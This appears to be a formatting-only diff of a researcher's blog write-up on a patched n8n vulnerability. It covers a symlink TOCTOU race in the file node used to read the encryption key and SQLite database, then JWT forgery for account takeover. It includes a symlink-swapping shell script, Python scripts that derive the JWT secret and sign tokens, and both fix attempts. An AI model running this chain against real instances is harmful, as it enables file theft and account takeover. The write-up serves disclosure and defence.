@@ -13,7 +13,7 @@ permalink: /writeups/toctou-leads-to-ato-on-n8n
 ---
 
 # Overview
-This is the write up of a n8n vulnerability I found, patched January 14 2026. Here is the github security advisory : [https://github.com/n8n-io/n8n/security/advisories/GHSA-gfvg-qv54-r4pc](https://github.com/n8n-io/n8n/security/advisories/GHSA-gfvg-qv54-r4pc).
+This is the write up of a n8n vulnerability I found, patched January 14 2026. Here is the github security advisory: [https://github.com/n8n-io/n8n/security/advisories/GHSA-gfvg-qv54-r4pc](https://github.com/n8n-io/n8n/security/advisories/GHSA-gfvg-qv54-r4pc).
 
 ## What is n8n?
 n8n is an open-source low-code orchestration tool which has gained a lot of popularity during recent years. Its use cases are wide, going from automating social media posts to acting as a SOAR (Security, Orchestration, Automation and Response). In company environment, it can be higly integrated with other tools, making it a critical target that can lead to whole infrastructure compromise.
@@ -37,7 +37,11 @@ During my first assesment of n8n security, I started by reading disclosed Github
 
 Basicaly, this vulnerability uses symlink to bypass restrictions on the "Read/Write file" node, which normaly permits reading or writing files only to certain locations on the underlying filesystem. Interestingly enough, it only affects self-hosted instances.
 
-I went ahead and checked how the fix was implemented. The summary of the [pull request](https://github.com/n8n-io/n8n/pull/17735) referenced is pretty self-explanatory : ```Use realpath function instead of resolve to resolve the real path of a file, in a case it is a symlink to a different location, which might be blocked```. Let's dive deeper and check the concerned code in [packages/core/src/execution-engine/node-execution-context/utils/file-system-helper-functions.ts](https://github.com/n8n-io/n8n/blob/d0a488a9ae1935ddd326290af915c17b0c8fbdb0/packages/core/src/execution-engine/node-execution-context/utils/file-system-helper-functions.ts) : 
+I went ahead and checked how the fix was implemented. The summary of the [pull request](https://github.com/n8n-io/n8n/pull/17735) referenced is pretty self-explanatory:
+
+```Use realpath function instead of resolve to resolve the real path of a file, in a case it is a symlink to a different location, which might be blocked```
+
+Let's dive deeper and check the concerned code in [packages/core/src/execution-engine/node-execution-context/utils/file-system-helper-functions.ts](https://github.com/n8n-io/n8n/blob/d0a488a9ae1935ddd326290af915c17b0c8fbdb0/packages/core/src/execution-engine/node-execution-context/utils/file-system-helper-functions.ts)
 
 ```typescript
 import { createReadStream } from 'node:fs';
@@ -92,7 +96,7 @@ The function "createReadStream" is called by the Read/Write file node with a fil
 
 The vulnerability lays in the fact that fsAccess and fs.createReadStream does resolve symlinks, but the isFilePathBlocked function uses resolve which doesn't. 
 
-If an attacker provides /home/node/pwn/passwd as a pathfile to the Read/Write file node, where pwn is a symlink pointing to /etc :
+If an attacker provides /home/node/pwn/passwd as a pathfile to the Read/Write file node, where pwn is a symlink pointing to /etc:
 - fsAccess returns true, because /etc/passwd exists (symlink resolved).
 - isFilePathBlocked returns false, because /home/node/pwn/passwd is not in a forbidden directory (symlink not resolved).
 - fs.createReadStream is created with the path /etc/passwd (symlink resolved).
@@ -105,7 +109,7 @@ The fix is working as intented, but something may have caught your eye like it d
 The 3 different symlink resolutions happen at 3 different times, opening up the possibility of a TOCTOU (Time-of-check vs Time-of-use) vulnerability.
 If we change what the symlink is pointing to between those moments, all 3 checks would be against different files.
 
-The attack scenario would look like this with the pathFile /home/node/pwn/passwd :
+The attack scenario would look like this with the pathFile /home/node/pwn/passwd:
 - Symlink pwn points to /etc.
 - fsAccess resolves to /etc/passwd and returns true (it also works if /home/node/passwd exists and pwn points to /home/node).
 - Symlink changes and points to /home/node.
@@ -113,7 +117,8 @@ The attack scenario would look like this with the pathFile /home/node/pwn/passwd
 - Symlink changes and points to /etc.
 - fs.createReadStream resolves to /etc/passwd and returns a ReadStream to this file.
 
-I first tested this on a self-hosted docker instance where I launched a simple bash script that repeatedly modifies a symlink between 2 destinations :
+I first tested this on a self-hosted docker instance where I launched a simple bash script that repeatedly modifies a symlink between 2 destinations:
+
 ```sh
 #!/bin/sh
 while true
@@ -125,7 +130,7 @@ ln -s /etc pwn
 done
 ```
 
-I then made a workflow which forever tries to exploit this race condition and only stop when the forbidden file is retrieved, or after a timeout :
+I then made a workflow which forever tries to exploit this race condition and only stop when the forbidden file is retrieved, or after a timeout:
 
 ![Readfile workflow](readfile.png)
 
@@ -136,11 +141,11 @@ By launching the bash script and then the workflow, the file is read after only 
 ## Symlinks management
 In order to really achieve this arbitrary read file vulnerability, the symlink quick change needs to be done from n8n.
 
-Git is the perfect candidate for this : it can handle symlinks and its branches can be used to switch between two directories.
+Git is the perfect candidate for this: it can handle symlinks and its branches can be used to switch between two directories.
 
 After setting up a Github repository (named n8n_ATO) with just one symlink named pwn, pointing to /etc in main branch and to /home/node in second branch, we can clone it to /home/node/n8n_ATO on the local filesystem with the Git Clone node.
 
-This workflow will repeatedly switch between the 2 branches until it timeouts :
+This workflow will repeatedly switch between the 2 branches until it timeouts:
 
 ![Git workflow](git.png)
 
@@ -155,7 +160,8 @@ By changing the file accessed and the forbidden directory pointed by the symlink
 Arbitrary File Read is done, let's see if we can escalate it further than the original report (spoiler: we can).
 
 In parallel to this race condition, I did some source code reading on how n8n manages sessions.
-It uses signed JWT as defined in [auth.service.ts](https://github.com/n8n-io/n8n/blob/master/packages/cli/src/auth/auth.service.ts) :
+It uses signed JWT as defined in [auth.service.ts](https://github.com/n8n-io/n8n/blob/master/packages/cli/src/auth/auth.service.ts):
+
 ```typescript
 interface AuthJwtPayload {
 	/** User Id */
@@ -196,7 +202,8 @@ private hash(input: string) {
 	return createHash('sha256').update(input).digest('base64');
 }
 ```
-In order to create a valid JWT, 6 pieces of information are needed :
+
+In order to create a valid JWT, 6 pieces of information are needed:
 - User Id.
 - User email.
 - User bcrypt encrypted password.
@@ -204,7 +211,8 @@ In order to create a valid JWT, 6 pieces of information are needed :
 - browserId.
 - JWT signature secret.
 
-All 4 first components are present in the database, more precisely in the user table :
+All 4 first components are present in the database, more precisely in the user table:
+
 ```sql
 sqlite> PRAGMA table_info(user);
 0|id|varchar|0||1
@@ -223,11 +231,13 @@ sqlite> PRAGMA table_info(user);
 13|lastActiveAt|date|0||0
 14|roleSlug|varchar(128)|1|'global:member'|0
 ```
+
 sqlite is the default database format of n8n, and it is kept in the file /home/node/.n8n/database.sqlite.
 
 The browserId can be arbitrary set.
 
-And the JWT signature secret is defined in [jwt.service.ts](https://github.com/n8n-io/n8n/blob/master/packages/cli/src/services/jwt.service.ts) :
+And the JWT signature secret is defined in [jwt.service.ts](https://github.com/n8n-io/n8n/blob/master/packages/cli/src/services/jwt.service.ts):
+
 ```typescript
 constructor({ encryptionKey }: InstanceSettings, globalConfig: GlobalConfig) {
 		this.jwtSecret = globalConfig.userManagement.jwtSecret;
@@ -249,14 +259,15 @@ It is derived from the encryptionKey, which is stocked in the /home/node/.n8n/co
 ## 0-Click ATO
 By retrieving these 2 files, we can forge any valid JWT and achieve Account Take Over. At least in theory, because when I tried to replicate this on a fresh cloud instance, I found an almost empty database.
 
-After further testing, I found out that I was tricked by the WAL (Write Ahead Logging) functionality of SQLite : changes to the database may not be instantly committed to the database.sqlite file, so in this case it contained no information about the owner account.
+After further testing, I found out that I was tricked by the WAL (Write Ahead Logging) functionality of SQLite: changes to the database may not be instantly committed to the database.sqlite file, so in this case it contained no information about the owner account.
 
 I needed to repeat the arbitrary read to download the /home/node/.n8n/database.sqlite-wal file, which contains non-committed changes.
 
 With both files in the same directory, opening the sqlite file with sqlite3 database.sqlite and fetching user data with ```SELECT id, email, password, mfaEnabled, mfaSecret FROM user;``` will automatically commit all the changes.
 
-Here are the python scripts I used for the POC :
+Here are the python scripts I used for the POC:
 - jwt_from_encryption.py that derives the JWT secret from the encryption key
+
 ```python
 import hashlib
 import argparse
@@ -279,8 +290,11 @@ if __name__ == "__main__":
     jwt_secret = derive_jwt_secret(args.encryption_key)
     print(jwt_secret)
 ```
-Usage : ```python3 jwt_from_encryption.py "<encryption_key>"```
+
+Usage: `python3 jwt_from_encryption.py "<encryption_key>"`
+
 - jwt_sign.py that creates and sign the JWT from all needed information
+
 ```python
 import jwt
 import datetime
@@ -365,7 +379,9 @@ token = service.issue_jwt(user, used_mfa=args.used_mfa, browser_id=args.browser_
 print("\nJWT TOKEN:")
 print(token)
 ```
-Usage : 
+
+Usage: 
+
 ```bash
 python3 jwt_sign.py \                                            
   --jwt-secret '<jwt_secret>' \
@@ -383,7 +399,8 @@ By providing the forged JWT and the corresponding browserId in requests to n8n, 
 
 # Remediation
 ## First fix attempt
-n8n development team quickly made a fix by resolving the path before calling createReadStream and preventing any potential symlinks from being followed inside the function :
+n8n development team quickly made a fix by resolving the path before calling createReadStream and preventing any potential symlinks from being followed inside the function:
+
 ```typescript
 async function resolvePath(path: PathLike): Promise<ResolvedFilePath> {
 	try {
@@ -406,13 +423,14 @@ async function resolvePath(path: PathLike): Promise<ResolvedFilePath> {
 ```
 
 However, my exploit still worked as it was and Account Take Over was still possible.
-I didn't dive very deep into why it was not working, so feel free to correct me if you think I am wrong, but I think it is because of 2 things :
+I didn't dive very deep into why it was not working, so feel free to correct me if you think I am wrong, but I think it is because of 2 things:
 - First, the fallback to resolve function if fsRealPath fails means we can still put unresolved symlink in resolvedFilePath.
 - Moreover, the O_NOFOLLOW flag prevents following symlinks ONLY if the symlink is at the end of the filepath, which is not the case in our POC (/home/node/n8n_ATO/pwn/config -> config is not a symlink). See [NodeJS doc](https://nodejs.org/api/fs.html#file-system-flags:~:text=flag%20can%20also%20be%20a%20number%20as%20documented%20by%20open(2)) that references [man Open(2)](https://man7.org/linux/man-pages/man2/open.2.html#:~:text=not%20have%20one.-,O_NOFOLLOW,-If%20the%20trailing).
 
 ## Working fix
-The second fix is more robust. It introduces 2 security layers :
+The second fix is more robust. It introduces 2 security layers:
 -  The path resolution is now split in half, between the dirname (here /home/node/n8n_ATO/pwn/) and the basename (here config). Only fsRealPath is used to resolve the dirname, so no symlink is left. Then, O_NOFOLLOW is used to open the file to prevent any symlink in the basename to be followed.
+
 ```typescript
 async function resolvePath(path: PathLike): Promise<ResolvedFilePath> {
 	const pathStr = path.toString();
@@ -431,6 +449,7 @@ async function resolvePath(path: PathLike): Promise<ResolvedFilePath> {
 	}
 }
 ```
+
 - Device and inode number of the path is checked at the beginning and at the end of the function, against the resolved path. This ensures the same file is checked and read.
 
 # Conclusion
@@ -442,7 +461,7 @@ Even if a company using n8n with critical tools applies least privilege principl
 However, a valid account is needed, which reduce the risk of this vulnerability being exploited in the wild. The authenticated nature of this vulnerability limit the practical risk to instances where users are trusted.
 
 ## Patch
-Quoting the advisory :
+Quoting the advisory:
 
 The issue has been fixed in n8n version 1.123.18 and 2.5.0. Users should upgrade to this version or later to remediate the vulnerability.
 
@@ -456,11 +475,11 @@ These workarounds do not fully remediate the risk and should only be used as sho
 I would like to strongly thank n8n security and dev teams, who responded quickly and with transparency. They provided regular updates on fix development, and the overall disclosure went smooth.
 
 # Timeline
-- Nov 22, 2025 : Vulnerability reported.
-- Nov 24, 2025 : Report acknowledged.
-- Dec 2, 2025 : Vulnerability confirmed.
-- Dec 18, 2025 : First fix released.
-- Dec 18, 2025 : Bypass of fix reported.
-- Jan 13, 2026 : Second fix released.
-- Jan 14, 2026 : Fix confirmed.
-- Feb 4, 2026 : Security advisory published and bounty awarded.
+- Nov 22, 2025: Vulnerability reported.
+- Nov 24, 2025: Report acknowledged.
+- Dec 2, 2025: Vulnerability confirmed.
+- Dec 18, 2025: First fix released.
+- Dec 18, 2025: Bypass of fix reported.
+- Jan 13, 2026: Second fix released.
+- Jan 14, 2026: Fix confirmed.
+- Feb 4, 2026: Security advisory published and bounty awarded.
